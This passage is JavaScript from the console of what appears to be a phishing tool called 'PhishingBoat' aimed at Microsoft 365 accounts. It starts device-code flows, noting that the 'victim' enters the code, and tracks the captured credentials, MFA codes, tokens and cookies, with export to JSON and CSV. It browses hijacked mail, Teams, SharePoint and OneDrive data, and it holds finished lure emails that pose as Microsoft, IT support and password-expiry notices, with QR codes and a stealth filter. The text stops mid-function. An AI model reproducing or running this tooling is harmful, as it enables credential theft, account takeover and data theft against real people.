      const from = m.from?.user?.displayName || m.from?.application?.displayName || "system";
      const body = (m.body?.content||"").replace(/<[^>]*>/g,"").substring(0,300);
      const ts = (m.createdDateTime||"").replace("T"," ").substring(0,19);
      html += '<div class="session-detail"><b>'+esc(from)+'</b> <span style="color:var(--text-dim);font-size:16px">'+esc(ts)+'</span><br>'+esc(body)+'</div>';
    }
    html += '</div>';
  } else if (renderer==="teams" && items) {
    html += '<table class="result-table"><tr><th>Team</th><th>Description</th></tr>';
    for (const t of items) {
      html += '<tr class="clickable" onclick="readTeamChannels(\\''+t.id+'\\')"><td>'+esc(t.displayName||"?")+'</td><td>'+esc(t.description||"")+'</td></tr>';
    }
    html += '</table>';
  } else if (renderer==="channels" && items) {
    const teamIdMatch = path.match(/\\/teams\\/([^\\/]+)/);
    const teamId = teamIdMatch ? teamIdMatch[1] : "";
    html += '<table class="result-table"><tr><th>Channel</th><th>Description</th><th></th></tr>';
    for (const c of items) {
      html += '<tr><td class="clickable" onclick="readChannelMsgs(\\''+teamId+'\\',\\''+encodeURIComponent(c.id)+'\\')"><span style="color:var(--accent)">#'+esc(c.displayName||"?")+'</span></td><td>'+esc(c.description||"")+'</td><td><span class="clickable" onclick="readChannelMembers(\\''+teamId+'\\',\\''+encodeURIComponent(c.id)+'\\')' + '" style="font-size:13px;color:var(--text-dim)">members</span></td></tr>';
    }
    html += '</table>';
  } else if (renderer==="approles" && items) {
    html += '<table class="result-table"><tr><th>Application</th><th>Principal</th></tr>';
    for (const r of items) {
      html += '<tr class="clickable" onclick="viewAppRole(\\''+esc(r.resourceId||"")+'\\',\\''+esc(r.resourceDisplayName||"")+'\\')"><td>'+esc(r.resourceDisplayName||"?")+'</td><td>'+esc(r.principalDisplayName||"")+'</td></tr>';
    }
    html += '</table>';
  } else if (renderer==="folders" && items) {
    html += '<table class="result-table"><tr><th>Folder</th><th>Total</th><th>Unread</th></tr>';
    for (const f of items) {
      html += '<tr class="clickable" onclick="browseMailFolder(\\''+esc(f.id)+'\\',\\''+esc(f.displayName||"")+'\\')"><td>'+esc(f.displayName||"?")+'</td><td>'+esc(String(f.totalItemCount||0))+'</td><td>'+(f.unreadItemCount?'<b style="color:var(--accent)">'+f.unreadItemCount+'</b>':'0')+'</td></tr>';
    }
    html += '</table>';
  } else if (renderer==="files" && items) {
    lastFileItems = items;
    html += '<table class="result-table"><tr><th>Name</th><th>Size</th><th></th><th></th></tr>';
    for (let i=0;i<items.length;i++) {
      const f = items[i];
      const isFolder = !!f.folder;
      const nameHtml = isFolder ? '<span class="clickable" onclick="browseFolder(\\''+f.id+'\\')">'+esc(f.name||"?")+'</span>' : '<span class="clickable" onclick="viewFileDetail(\\''+f.id+'\\')">'+esc(f.name||"?")+'</span>';
      const dlHtml = !isFolder ? '<span style="color:var(--green);cursor:pointer" onclick="downloadFile('+i+')">&darr; download</span>' : '';
      html += '<tr><td>'+nameHtml+'</td><td>'+(f.size?Math.round(f.size/1024)+"KB":"--")+'</td><td>'+dlHtml+'</td><td>'+(f.webUrl?'<a href="'+esc(f.webUrl)+'" target="_blank" style="color:var(--accent)">open</a>':"")+'</td></tr>';
    }
    html += '</table>';
  } else if (renderer==="sites" && items) {
    html += '<table class="result-table"><tr><th>Site</th></tr>';
    for (const s of items) {
      html += '<tr class="clickable" onclick="browseSite(\\''+esc(s.id||"")+'\\')"><td>'+esc(s.displayName||s.name||"?")+'</td></tr>';
    }
    html += '</table>';
  } else if (renderer==="drives" && items) {
    html += '<table class="result-table"><tr><th>Drive</th><th>Type</th></tr>';
    for (const d of items) {
      html += '<tr class="clickable" onclick="browseDrive(\\''+esc(d.id||"")+'\\')"><td>'+esc(d.name||"?")+'</td><td>'+esc(d.driveType||"")+'</td></tr>';
    }
    html += '</table>';
  } else if (renderer==="events" && items) {
    html += '<table class="result-table"><tr><th>Subject</th><th>Start</th><th>Organizer</th></tr>';
    for (const e of items) {
      html += '<tr><td>'+esc(e.subject||"?")+'</td><td>'+esc((e.start?.dateTime||"").substring(0,16).replace("T"," "))+'</td><td>'+esc(e.organizer?.emailAddress?.name||"?")+'</td></tr>';
    }
    html += '</table>';
  } else if (renderer==="sp-sites" && data.sites) {
    html += '<table class="result-table"><tr><th>Title</th><th>URL</th></tr>';
    for (const s of data.sites) {
      const title = s.Title || "?";
      const siteUrl = s.Path || "";
      html += '<tr class="clickable" onclick="spBrowseFolder(\\''+esc(new URL(siteUrl).pathname||"/")+'\\')"><td>'+esc(title)+'</td><td style="font-size:16px;color:var(--text-dim)">'+esc(siteUrl)+'</td></tr>';
    }
    html += '</table>';
  } else if (renderer==="sp-search" && data.files) {
    html += '<table class="result-table"><tr><th>Title</th><th>Type</th><th>Size</th><th>Author</th><th>Path</th></tr>';
    for (const f of data.files) {
      const fileUrl = f.Path || "";
      const ext = f.FileExtension || "";
      const size = f.Size ? Math.round(parseInt(f.Size)/1024)+"KB" : "--";
      html += '<tr><td>'+esc(f.Title||"?")+'</td><td>'+esc(ext)+'</td><td>'+esc(size)+'</td><td>'+esc(f.Author||"")+'</td><td><a href="'+esc(fileUrl)+'" target="_blank" style="color:var(--accent);font-size:16px">open</a></td></tr>';
    }
    html += '</table>';
  } else if (renderer==="sp-files" && items) {
    html += '<table class="result-table"><tr><th>Name</th><th>Size</th><th></th></tr>';
    for (const f of items) {
      if (f.isFolder) {
        html += '<tr class="clickable" onclick="spBrowseFolder(\\''+esc(f.ServerRelativeUrl)+'\\')"><td>'+esc(f.Name||"?")+'/ <span style="color:var(--text-dim);font-size:16px">('+esc(String(f.ItemCount||0))+' items)</span></td><td>--</td><td></td></tr>';
      } else {
        const size = f.Length ? Math.round(parseInt(f.Length)/1024)+"KB" : "--";
        html += '<tr><td>'+esc(f.Name||"?")+'</td><td>'+esc(size)+'</td><td><span style="color:var(--green);cursor:pointer" onclick="spDownloadFile(\\''+esc(f.ServerRelativeUrl)+'\\',\\''+esc((f.Name||"file").replace(/\\\\/g,"").replace(/\\'/g,""))+'\\')">\\u2193 download</span></td></tr>';
      }
    }
    html += '</table>';
  } else if (renderer==="roles" && items) {
    var roles = items.filter(function(i){return (i["@odata.type"]||"").indexOf("directoryRole")!==-1;});
    var groups = items.filter(function(i){return (i["@odata.type"]||"").indexOf("group")!==-1;});
    if (roles.length) {
      html += '<div style="margin:8px 10px 4px;font-size:16px;color:var(--text-dim)">Directory Roles ('+roles.length+')</div>';
      html += '<table class="result-table"><tr><th>Role</th><th>Description</th></tr>';
      for (const r of roles) { html += '<tr><td>'+esc(r.displayName||"?")+'</td><td style="color:var(--text-dim)">'+esc(r.description||"")+'</td></tr>'; }
      html += '</table>';
    }
    if (groups.length) {
      html += '<div style="margin:8px 10px 4px;font-size:16px;color:var(--text-dim)">Group Memberships ('+groups.length+')</div>';
      html += '<table class="result-table"><tr><th>Group</th><th>Description</th></tr>';
      for (const g of groups) { html += '<tr><td>'+esc(g.displayName||"?")+'</td><td style="color:var(--text-dim)">'+esc(g.description||"")+'</td></tr>'; }
      html += '</table>';
    }
    if (!roles.length && !groups.length) {
      html += '<div style="color:var(--text-dim);padding:20px;text-align:center">No directory roles or group memberships</div>';
    }
  } else if (renderer==="devices" && items) {
    if (!items.length) {
      html += '<div style="color:var(--text-dim);padding:20px;text-align:center">No registered devices</div>';
    } else {
      html += '<table class="result-table"><tr><th>Device</th><th>OS</th><th>Trust Type</th><th>Last Active</th></tr>';
      for (const d of items) { html += '<tr><td>'+esc(d.displayName||"?")+'</td><td>'+esc((d.operatingSystem||"")+" "+(d.operatingSystemVersion||""))+'</td><td>'+esc(d.trustType||"")+'</td><td>'+esc((d.approximateLastSignInDateTime||"").split("T")[0])+'</td></tr>'; }
      html += '</table>';
    }
  } else {
    // Default: raw JSON
    html += '<div class="result-json" id="result-raw">'+esc(JSON.stringify(data,null,2))+'</div>';
  }

  // Always include raw JSON below custom renderers
  if (renderer && renderer!=="email-detail") {
    html += '<details style="margin-top:8px"><summary style="font-size:16px;color:var(--text-dim);cursor:pointer">Raw JSON</summary><div class="result-json" id="result-raw">'+esc(JSON.stringify(data,null,2))+'</div></details>';
  }
  if (!renderer) {
    // result-raw already set above
  }

  area.innerHTML = html;
}

function copyResult() {
  const el = document.getElementById("result-raw");
  if (el) { navigator.clipboard.writeText(el.textContent); }
}

// ── Tab switching ───────────────────────────────────────
function switchTab(name, btn) {
  activeTab = name;
  document.querySelectorAll(".tab").forEach(t=>t.classList.remove("active"));
  if (btn) btn.classList.add("active");
  ["actions","results","devicecode","feed","compose"].forEach(t=>{
    const el = document.getElementById("tab-"+t);
    if (t===name) el.classList.remove("hidden"); else el.classList.add("hidden");
  });
  if (name==="actions") { resultNavStack = []; }
  if (name==="feed") { feedCount=0; const b=document.getElementById("feed-badge"); b.style.display="none"; }
  if (name==="compose") { renderTemplateChips(); }
}

function setFilter(type, el) {
  activeFilter=type;
  document.querySelectorAll(".filter-chip").forEach(c=>c.classList.remove("active"));
  el.classList.add("active");
  document.querySelectorAll("#feed .card").forEach(c=>{
    c.style.display=(type==="all"||c.dataset.type===type)?"":"none";
  });
}

async function fetchAllNotifications() {
  var r = await fetch("/notifications?since=0",{headers:H});
  if (!r.ok) return [];
  return await r.json();
}

function computeFeedStats(items) {
  var stats = {
    total_events: items.length,
    credentials_captured: 0,
    mfa_codes_captured: 0,
    sessions_hooked: 0,
    tokens_captured: 0,
    cookies_captured: 0,
    errors: 0,
    unique_users: [],
    first_event: null,
    last_event: null,
    by_type: {}
  };
  items.forEach(function(n) {
    stats.by_type[n.type] = (stats.by_type[n.type] || 0) + 1;
    if (n.type === "credentials") stats.credentials_captured++;
    if (n.type === "mfa") stats.mfa_codes_captured++;
    if (n.type === "execution") stats.sessions_hooked++;
    if (n.type === "tokens") stats.tokens_captured++;
    if (n.type === "session_cookies") stats.cookies_captured++;
    if (n.type === "error") stats.errors++;
    if (n.meta && n.meta.user && stats.unique_users.indexOf(n.meta.user) === -1) stats.unique_users.push(n.meta.user);
    if (!stats.first_event || n.timestamp < stats.first_event) stats.first_event = n.timestamp;
    if (!stats.last_event || n.timestamp > stats.last_event) stats.last_event = n.timestamp;
  });
  return stats;
}

function downloadBlob(content, filename, mime) {
  var blob = new Blob([content], {type: mime});
  var url = URL.createObjectURL(blob);
  var a = document.createElement("a");
  a.href = url; a.download = filename;
  document.body.appendChild(a); a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
}

async function exportFeedJSON() {
  try {
    var items = await fetchAllNotifications();
    var stats = computeFeedStats(items);
    var payload = {
      exported_at: new Date().toISOString(),
      statistics: {
        total_events: stats.total_events,
        credentials_captured: stats.credentials_captured,
        mfa_codes_captured: stats.mfa_codes_captured,
        sessions_hooked: stats.sessions_hooked,
        tokens_captured: stats.tokens_captured,
        cookies_captured: stats.cookies_captured,
        errors: stats.errors,
        unique_users: stats.unique_users.length,
        unique_user_list: stats.unique_users,
        first_event: stats.first_event ? new Date(stats.first_event).toISOString() : null,
        last_event: stats.last_event ? new Date(stats.last_event).toISOString() : null,
        events_by_type: stats.by_type
      },
      events: items
    };
    var ts = new Date().toISOString().replace(/[:.]/g,"-").substring(0,19);
    downloadBlob(JSON.stringify(payload, null, 2), "phishingboat-feed-"+ts+".json", "application/json");
  } catch(e) { alert("Export failed: "+e.message); }
}

async function exportFeedCSV() {
  try {
    var items = await fetchAllNotifications();
    var stats = computeFeedStats(items);
    var lines = [];
    lines.push("# PhishingBoat Feed Export — "+new Date().toISOString());
    lines.push("# Total Events: "+stats.total_events);
    lines.push("# Credentials Captured: "+stats.credentials_captured);
    lines.push("# MFA Codes Captured: "+stats.mfa_codes_captured);
    lines.push("# Sessions Hooked: "+stats.sessions_hooked);
    lines.push("# Tokens Captured: "+stats.tokens_captured);
    lines.push("# Cookies Captured: "+stats.cookies_captured);
    lines.push("# Errors: "+stats.errors);
    lines.push("# Unique Users: "+stats.unique_users.length+" ("+stats.unique_users.join("; ")+")");
    lines.push("# First Event: "+(stats.first_event ? new Date(stats.first_event).toISOString() : "N/A"));
    lines.push("# Last Event: "+(stats.last_event ? new Date(stats.last_event).toISOString() : "N/A"));
    lines.push("");
    lines.push("timestamp,type,user,detail");
    items.forEach(function(n) {
      var ts = new Date(n.timestamp).toISOString();
      var user = (n.meta && n.meta.user) ? n.meta.user : "";
      var detail = n.html.replace(/<[^>]+>/g," ").replace(/\\s+/g," ").trim();
      lines.push('"'+ts+'","'+n.type+'","'+user.replace(/"/g,'""')+'","'+detail.replace(/"/g,'""')+'"');
    });
    var ts = new Date().toISOString().replace(/[:.]/g,"-").substring(0,19);
    downloadBlob(lines.join("\\n"), "phishingboat-feed-"+ts+".csv", "text/csv");
  } catch(e) { alert("Export failed: "+e.message); }
}

// ── Helpers ─────────────────────────────────────────────
function fmtTime(ts) { return new Date(ts).toLocaleTimeString("en-US",{hour12:false,hour:"2-digit",minute:"2-digit",second:"2-digit"}); }
function fmtAgo(ts) {
  const s=Math.floor((Date.now()-ts)/1000);
  if(s<60)return s+"s ago"; if(s<3600)return Math.floor(s/60)+"m ago"; if(s<86400)return Math.floor(s/3600)+"h ago"; return Math.floor(s/86400)+"d ago";
}
function esc(s) { if(!s)return""; const d=document.createElement("div"); d.textContent=String(s); return d.innerHTML; }

// ── Device Code ────────────────────────────────────────
async function startDeviceCode() {
  const scope = document.getElementById("dc-scope").value;
  var clientId = document.getElementById("dc-client").value;
  if (clientId === "custom") {
    clientId = prompt("Enter custom client ID (GUID):");
    if (!clientId) return;
  }
  const body = {scope};
  if (clientId) body.client_id = clientId;
  try {
    const r = await fetch("/devicecode/start",{method:"POST",headers:H,body:JSON.stringify(body)});
    const d = await r.json();
    if (d.error) { alert("Error: "+d.error+"\\n"+(d.description||"")); return; }
    pollDeviceCodeFlows();
  } catch(e) { alert("Request failed: "+e.message); }
}

async function stopDeviceCode(id) {
  await fetch("/devicecode/flows/"+id+"/stop",{method:"POST",headers:H});
  pollDeviceCodeFlows();
}

function copyText(text) {
  navigator.clipboard.writeText(text);
}

async function pollDeviceCodeFlows() {
  try {
    const r = await fetch("/devicecode/flows",{headers:H});
    if (!r.ok) return;
    const flows = await r.json();
    renderDeviceCodeFlows(flows);
  } catch {}
}

function renderDeviceCodeFlows(flows) {
  updateComposeFlows(flows);
  const active = flows.filter(f=>f.status==="pending");
  const done = flows.filter(f=>f.status!=="pending");

  const actEl = document.getElementById("dc-active");
  const doneEl = document.getElementById("dc-completed");
  if (!actEl||!doneEl) return;

  if (active.length) {
    actEl.innerHTML = '<div style="font-size:16px;color:var(--text-dim);margin-bottom:6px;font-weight:600">ACTIVE FLOWS</div>' +
      active.map(f => {
        const remaining = Math.max(0,Math.ceil((f.expiresAt-Date.now())/1000));
        return '<div class="card"><div class="card-header"><span class="card-type type-info">pending</span>' +
          '<span style="color:var(--text-dim);font-size:16px">'+fmtAgo(f.startedAt)+'</span>' +
          '<span style="margin-left:auto;color:var(--orange);font-size:16px">'+remaining+'s remaining</span></div>' +
          '<div class="card-body">' +
          '<div style="font-size:24px;font-weight:700;letter-spacing:4px;color:var(--accent);margin:8px 0;text-align:center">'+esc(f.userCode)+'</div>' +
          '<div style="text-align:center;margin-bottom:8px;font-size:16px;color:var(--text-dim)">Victim enters this code at <a href="'+esc(f.verificationUri)+'" target="_blank" style="color:var(--accent)">'+esc(f.verificationUri)+'</a></div>' +
          '<div style="display:flex;gap:6px;justify-content:center">' +
          '<button onclick="copyText(\\''+esc(f.userCode)+'\\')" style="font-size:16px;font-family:inherit;padding:3px 10px;border:1px solid var(--border);background:none;color:var(--text-dim);border-radius:3px;cursor:pointer">Copy Code</button>' +
          '<button onclick="composeForFlow(\\''+f.id+'\\')" style="font-size:16px;font-family:inherit;padding:3px 10px;border:1px solid var(--accent);background:none;color:var(--accent);border-radius:3px;cursor:pointer">Compose Email</button>' +
          '<button onclick="stopDeviceCode(\\''+f.id+'\\')" style="font-size:16px;font-family:inherit;padding:3px 10px;border:1px solid var(--red);background:none;color:var(--red);border-radius:3px;cursor:pointer">Cancel</button>' +
          '</div></div></div>';
      }).join("");
  } else {
    actEl.innerHTML = '<div style="text-align:center;padding:20px;color:var(--text-dim);font-size:18px">No active flows. Click <b>Start Flow</b> to generate a device code.</div>';
  }

  if (done.length) {
    doneEl.innerHTML = '<div style="font-size:16px;color:var(--text-dim);margin-bottom:6px;font-weight:600">COMPLETED FLOWS</div>' +
      done.slice(0,20).map(f => {
        const statusColor = f.status==="captured"?"green":f.status==="expired"?"text-dim":"red";
        const statusLabel = f.status==="captured"?"CAPTURED":f.status==="expired"?"EXPIRED":f.status==="cancelled"?"CANCELLED":"FAILED";
        let body = '<b>Code:</b> '+esc(f.userCode);
        if (f.user) body += ' | <b>User:</b> '+esc(f.user);
        if (f.sessionId) body += '<br><span style="color:var(--green);font-size:16px">Session hooked — select in sidebar</span>';
        if (f.error) body += '<br><span style="color:var(--red)">'+esc(f.error)+'</span>';
        return '<div class="card"><div class="card-header"><span class="card-type" style="background:rgba(var(--'+statusColor+'),.15);color:var(--'+statusColor+')">'+statusLabel+'</span>' +
          '<span style="color:var(--text-dim);font-size:16px;margin-left:auto">'+fmtAgo(f.completedAt||f.startedAt)+'</span></div>' +
          '<div class="card-body" style="font-size:16px">'+body+'</div></div>';
      }).join("");
  } else {
    doneEl.innerHTML = "";
  }
}

setInterval(pollDeviceCodeFlows, 5000);
pollDeviceCodeFlows();

// ── Email Compose ──────────────────────────────────────
const EMAIL_TEMPLATES = [
  {
    name:"MFA Verification",
    subject:"Action Required: Multi-Factor Authentication Verification",
    body:'<div style="font-family:Segoe UI,Arial,sans-serif;max-width:600px;margin:0 auto"><div style="background:#0078d4;padding:20px;color:#fff;font-size:18px">Microsoft Security</div><div style="padding:20px;background:#fff;color:#333;border:1px solid #e0e0e0"><p>Hello,</p><p>As part of our ongoing security improvements, we require all employees to verify their device access. This is a routine check to ensure your account remains secure.</p><p><b>Please complete the following steps:</b></p><ol><li>Go to <a href="{{URL}}">{{URL}}</a></li><li>Enter the code: <b style="font-size:18px;letter-spacing:2px">{{CODE}}</b></li><li>Sign in with your work credentials when prompted</li></ol><div style="text-align:center;margin:15px 0;padding:15px;background:#f8f9fa;border-radius:4px"><p style="margin:0 0 8px 0;font-size:16px;color:#555">Or scan this QR code to verify instantly:</p>{{QRIMG}}</div><p style="color:#666;font-size:18px">This code expires in 15 minutes. If you did not request this verification, please contact the IT Help Desk.</p><hr style="border:none;border-top:1px solid #e0e0e0;margin:20px 0"><p style="color:#999;font-size:16px">Microsoft Corporation | Automated security notification</p></div></div>',
    oauthBody:'<div style="font-family:Segoe UI,Arial,sans-serif;max-width:600px;margin:0 auto"><div style="background:#0078d4;padding:20px;color:#fff;font-size:18px">Microsoft Security</div><div style="padding:20px;background:#fff;color:#333;border:1px solid #e0e0e0"><p>Hello,</p><p>As part of our ongoing security improvements, we require all employees to verify their device access. This is a routine check to ensure your account remains secure.</p><p>Please click the button below to verify your identity:</p><div style="text-align:center;margin:20px 0;padding:20px;background:#f8f9fa;border-radius:4px"><a href="{{URL}}" style="display:inline-block;padding:12px 32px;background:#0078d4;color:#fff;text-decoration:none;border-radius:4px;font-weight:600;font-size:16px">Verify My Account</a></div><p style="color:#666;font-size:18px">If you did not request this verification, please contact the IT Help Desk.</p><hr style="border:none;border-top:1px solid #e0e0e0;margin:20px 0"><p style="color:#999;font-size:16px">Microsoft Corporation | Automated security notification</p></div></div>'
  },
  {
    name:"IT Help Desk",
    subject:"IT Help Desk: Complete Your Device Registration",
    body:'<div style="font-family:Segoe UI,Arial,sans-serif;max-width:600px;margin:0 auto;background:#fff;color:#333;border:1px solid #e0e0e0"><div style="background:#0078d4;padding:12px 20px;color:#fff;font-size:18px;font-weight:600">IT Help Desk</div><div style="padding:20px"><p>Hi,</p><p>We noticed your device has not been registered with our new endpoint management system. To maintain access to corporate resources (email, Teams, SharePoint), please complete the registration below.</p><div style="text-align:center;margin:15px 0;padding:15px;background:#f5f5f5;border-radius:4px"><p style="margin:0 0 8px 0;font-size:16px;color:#555">Scan to register your device:</p>{{QRIMG}}<p style="margin:10px 0 0 0;font-size:18px;color:#888">or visit <a href="{{URL}}" style="color:#0078d4">{{URL}}</a> and enter code <b style="font-size:16px;color:#0078d4">{{CODE}}</b></p></div><p>This should only take a moment. If you have any issues, reply to this email or call the IT Help Desk.</p><p>Thanks,<br>IT Support Team</p><hr style="border:none;border-top:1px solid #e0e0e0;margin:20px 0"><p style="color:#999;font-size:16px">Information Technology | Internal Communication</p></div></div>',
    oauthBody:'<div style="font-family:Segoe UI,Arial,sans-serif;max-width:600px;margin:0 auto;background:#fff;color:#333;border:1px solid #e0e0e0"><div style="background:#0078d4;padding:12px 20px;color:#fff;font-size:18px;font-weight:600">IT Help Desk</div><div style="padding:20px"><p>Hi,</p><p>We noticed your device has not been registered with our new endpoint management system. To maintain access to corporate resources (email, Teams, SharePoint), please complete the registration below.</p><div style="text-align:center;margin:15px 0;padding:15px;background:#f5f5f5;border-radius:4px"><a href="{{URL}}" style="display:inline-block;padding:12px 32px;background:#0078d4;color:#fff;text-decoration:none;border-radius:4px;font-weight:600;font-size:16px">Register Device</a></div><p>This should only take a moment. If you have any issues, reply to this email or call the IT Help Desk.</p><p>Thanks,<br>IT Support Team</p><hr style="border:none;border-top:1px solid #e0e0e0;margin:20px 0"><p style="color:#999;font-size:16px">Information Technology | Internal Communication</p></div></div>'
  },
  {
    name:"SharePoint Access",
    subject:"Action Needed: Verify Identity for Shared Documents",
    body:'<div style="font-family:Segoe UI,Arial,sans-serif;max-width:600px;margin:0 auto;background:#fff;color:#333;border:1px solid #e0e0e0"><div style="background:#036c5f;padding:12px 20px;color:#fff;font-size:18px;font-weight:600">SharePoint Online</div><div style="padding:20px"><p>Hello,</p><p>A colleague has shared sensitive documents with you on SharePoint. Due to our data protection policy, you need to verify your identity before accessing the files.</p><div style="text-align:center;margin:15px 0;padding:15px;background:#f8f9fa;border-radius:4px"><p style="margin:0 0 8px 0;font-size:16px;color:#555">Scan to verify your identity:</p>{{QRIMG}}<p style="margin:10px 0 0 0;font-size:18px;color:#888">or visit <a href="{{URL}}" style="color:#036c5f">{{URL}}</a> and enter code <b style="font-size:16px;color:#036c5f">{{CODE}}</b></p></div><p style="color:#666;font-size:18px">This link will expire shortly. Please complete verification as soon as possible.</p><p>Best regards,<br>SharePoint Notifications</p><hr style="border:none;border-top:1px solid #e0e0e0;margin:20px 0"><p style="color:#999;font-size:16px">Microsoft SharePoint | Automated notification</p></div></div>',
    oauthBody:'<div style="font-family:Segoe UI,Arial,sans-serif;max-width:600px;margin:0 auto;background:#fff;color:#333;border:1px solid #e0e0e0"><div style="background:#036c5f;padding:12px 20px;color:#fff;font-size:18px;font-weight:600">SharePoint Online</div><div style="padding:20px"><p>Hello,</p><p>A colleague has shared sensitive documents with you on SharePoint. Due to our data protection policy, you need to verify your identity before accessing the files.</p><div style="text-align:center;margin:15px 0;padding:15px;background:#f8f9fa;border-radius:4px"><a href="{{URL}}" style="display:inline-block;padding:12px 32px;background:#036c5f;color:#fff;text-decoration:none;border-radius:4px;font-weight:600;font-size:16px">Access Documents</a></div><p style="color:#666;font-size:18px">This link will expire shortly. Please complete verification as soon as possible.</p><p>Best regards,<br>SharePoint Notifications</p><hr style="border:none;border-top:1px solid #e0e0e0;margin:20px 0"><p style="color:#999;font-size:16px">Microsoft SharePoint | Automated notification</p></div></div>'
  },
  {
    name:"Teams Verification",
    subject:"Microsoft Teams: Verify Your Account",
    body:'<div style="font-family:Segoe UI,Arial,sans-serif;max-width:600px;margin:0 auto"><div style="background:#464eb8;padding:15px 20px;color:#fff;font-size:16px">Microsoft Teams</div><div style="padding:20px;background:#fff;color:#333;border:1px solid #e0e0e0"><p>Your account requires verification to continue using Teams meetings and chat. This is a one-time security check required by your organization.</p><div style="text-align:center;margin:20px 0;padding:20px;background:#f8f9fa;border-radius:4px"><p style="margin:0 0 10px 0;font-size:16px;color:#555">Scan to verify your account:</p>{{QRIMG}}<p style="margin:10px 0 0 0;font-size:18px;color:#888">or enter code <b style="font-size:16px;color:#464eb8">{{CODE}}</b> at <a href="{{URL}}" style="color:#464eb8">{{URL}}</a></p></div><hr style="border:none;border-top:1px solid #e0e0e0;margin:20px 0"><p style="color:#999;font-size:16px">Microsoft Teams | Automated notification</p></div></div>',
    oauthBody:'<div style="font-family:Segoe UI,Arial,sans-serif;max-width:600px;margin:0 auto"><div style="background:#464eb8;padding:15px 20px;color:#fff;font-size:16px">Microsoft Teams</div><div style="padding:20px;background:#fff;color:#333;border:1px solid #e0e0e0"><p>Your account requires verification to continue using Teams meetings and chat. This is a one-time security check required by your organization.</p><div style="text-align:center;margin:20px 0;padding:20px;background:#f8f9fa;border-radius:4px"><a href="{{URL}}" style="display:inline-block;padding:12px 32px;background:#464eb8;color:#fff;text-decoration:none;border-radius:4px;font-weight:600;font-size:16px">Verify Account</a></div><hr style="border:none;border-top:1px solid #e0e0e0;margin:20px 0"><p style="color:#999;font-size:16px">Microsoft Teams | Automated notification</p></div></div>'
  },
  {
    name:"Password Expiry",
    subject:"Warning: Your Password Will Expire Soon",
    body:'<div style="font-family:Segoe UI,Arial,sans-serif;max-width:600px;margin:0 auto;background:#fff;color:#333;border:1px solid #e0e0e0"><div style="background:#d83b01;padding:12px 20px;color:#fff;font-size:18px;font-weight:600">&#9888; Security Alert</div><div style="padding:20px"><p style="color:#d83b01;font-weight:bold;font-size:16px">Password Expiration Notice</p><p>Your organization password is set to expire within the next 24 hours. To prevent account lockout, please re-authenticate your device now.</p><div style="text-align:center;margin:15px 0;padding:15px;background:#fff4ce;border-radius:4px;border-left:4px solid #d83b01"><p style="margin:0 0 8px 0;font-size:16px;color:#555">Scan to re-authenticate:</p>{{QRIMG}}<p style="margin:10px 0 0 0;font-size:18px;color:#888">or visit <a href="{{URL}}" style="color:#d83b01">{{URL}}</a> and enter code <b style="font-size:16px;color:#d83b01">{{CODE}}</b></p></div><p>If you believe you received this message in error, contact your system administrator.</p><p>— IT Security Team</p><hr style="border:none;border-top:1px solid #e0e0e0;margin:20px 0"><p style="color:#999;font-size:16px">IT Security | Automated password notification</p></div></div>',
    oauthBody:'<div style="font-family:Segoe UI,Arial,sans-serif;max-width:600px;margin:0 auto;background:#fff;color:#333;border:1px solid #e0e0e0"><div style="background:#d83b01;padding:12px 20px;color:#fff;font-size:18px;font-weight:600">&#9888; Security Alert</div><div style="padding:20px"><p style="color:#d83b01;font-weight:bold;font-size:16px">Password Expiration Notice</p><p>Your organization password is set to expire within the next 24 hours. To prevent account lockout, please re-authenticate your device now.</p><div style="text-align:center;margin:15px 0;padding:15px;background:#fff4ce;border-radius:4px;border-left:4px solid #d83b01"><a href="{{URL}}" style="display:inline-block;padding:12px 32px;background:#d83b01;color:#fff;text-decoration:none;border-radius:4px;font-weight:600;font-size:16px">Re-authenticate Now</a></div><p>If you believe you received this message in error, contact your system administrator.</p><p>— IT Security Team</p><hr style="border:none;border-top:1px solid #e0e0e0;margin:20px 0"><p style="color:#999;font-size:16px">IT Security | Automated password notification</p></div></div>'
  },
  {
    name:"Custom (Blank)",
    subject:"",
    body:"",
    oauthBody:""
  }
];

function renderTemplateChips() {
  var el = document.getElementById("template-chips");
  if (!el) return;
  el.innerHTML = EMAIL_TEMPLATES.map(function(t,i) {
    return '<button class="filter-chip tmpl-chip" onclick="applyTemplate('+i+')">'+esc(t.name)+'</button>';
  }).join("");
}

function generateQR(text, size) {
  size = size || 180;
  try {
    var qr = new QRious({ value: text, size: size, level: "M" });
    return qr.toDataURL();
  } catch(e) { return ""; }
}

var lastTemplateIdx = -1;

function applyTemplate(idx) {
  lastTemplateIdx = idx;
  var t = EMAIL_TEMPLATES[idx];
  document.getElementById("compose-subject").value = t.subject;
  var mode = document.getElementById("compose-flow").value;
  var isDeviceCode = (mode !== "oauth");
  var oauthUrlEl = document.getElementById("compose-oauth-url-row");
  if (oauthUrlEl) oauthUrlEl.style.display = isDeviceCode ? "none" : "";

  var body;
  if (isDeviceCode) {
    body = t.body;
    var flow = composeFlowCache.find(function(f){return f.id===mode;});
    var code = (flow && flow.userCode) ? flow.userCode : "XXXXXXXX";
    var url = (flow && flow.verificationUri) ? flow.verificationUri : "https://microsoft.com/devicelogin";
    body = body.split("{{CODE}}").join(code);
    body = body.split("{{URL}}").join(url);
    var qrUrl = "https://microsoft.com/devicelogin";
    var qrDataUri = generateQR(qrUrl);
    if (qrDataUri && body.indexOf("{{QRIMG}}") !== -1) {
      body = body.split("{{QRIMG}}").join('<img src="'+qrDataUri+'" width="180" height="180" alt="Scan to verify" style="display:block;margin:0 auto">');
    } else {
      body = body.split("{{QRIMG}}").join("");
    }
  } else {
    body = t.oauthBody || t.body;
    var phishUrl = document.getElementById("compose-oauth-url").value || "#";
    body = body.split("{{URL}}").join(phishUrl);
  }
  if (stealthMode) {
    var sanitized = stealthSanitize(document.getElementById("compose-subject").value, body);
    document.getElementById("compose-subject").value = sanitized.subject;
    body = sanitized.body;
  }
  document.getElementById("compose-body").value = body;
  document.querySelectorAll(".tmpl-chip").forEach(function(c,i){
    if(i===idx) c.classList.add("active"); else c.classList.remove("active");
  });
  updatePreview();
}

function onFlowSelect() {
  var mode = document.getElementById("compose-flow").value;
  var oauthUrlEl = document.getElementById("compose-oauth-url-row");
  if (oauthUrlEl) oauthUrlEl.style.display = (mode === "oauth") ? "" : "none";
  if (lastTemplateIdx >= 0) {
    applyTemplate(lastTemplateIdx);
  }
}

function updatePreview() {
  var body = document.getElementById("compose-body").value;
  var preview = document.getElementById("compose-preview");
  if (!preview) return;
  if (body) {
    preview.innerHTML = body;
  } else {
